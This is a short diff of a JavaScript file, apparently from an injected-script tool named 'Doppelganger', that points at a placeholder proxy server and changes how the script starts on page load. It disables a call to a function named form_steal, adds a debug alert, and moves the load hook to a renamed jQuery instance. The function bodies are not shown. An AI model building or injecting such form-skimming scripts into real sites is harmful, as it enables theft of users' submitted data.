@@ -1,12 +1,12 @@
 var httpServer="http://proxyIpAddr:httpPort";
 
-
+//jQuery.noConflict();
 
 function initialize_doppelganger()
 {
 	//display_calling_card();
-	form_steal();
-	//alert("Doppelganger running!");
+	//form_steal();
+	alert("Doppelganger running!");
 }
 
 function display_calling_card()
@@ -60,5 +60,8 @@ function break_fixit()
 }
 
 //Event.observe(window, "load", function() { initialize_doppelganger(); });
-document.observe("dom:loaded", function() { initialize_doppelganger(); });
+//document.observe("dom:loaded", function() { initialize_doppelganger(); });
+
+//jQuery.ready(function() { alert("JQuery Active!"); });
+$jDoppelganger(document).ready(function() { initialize_doppelganger(); });
 
